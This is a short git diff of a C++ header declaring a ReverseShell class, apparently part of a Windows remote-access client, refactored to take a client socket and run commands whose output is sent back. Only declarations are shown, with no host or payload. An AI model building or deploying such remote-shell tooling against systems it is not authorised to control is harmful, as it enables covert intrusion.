@@ -9,18 +9,19 @@
 #include "Sender.h"
 #include "json.hpp"
 #include <windows.h>
+#include "ClientSocket.h"
+#include "Handler.h"
 
 
 
-class ReverseShell : public Sender{
+class ReverseShell : public Handler {
 private:
     std::string currentDirectory=".";
 public:
     void executeCommandAndSendResult(nlohmann::json jsonObject);
-    explicit ReverseShell(const Stream &stream, std::unordered_map<std::string, std::function<void(nlohmann::json &)>> &actionMap);
+    explicit ReverseShell(ClientSocket &clientSocket);
     std::string executeCommand(const std::wstring&);
     static int runCmd(const std::string &commandToExecute, std::string& outOutput);
-    void send() override;
 };
 
 
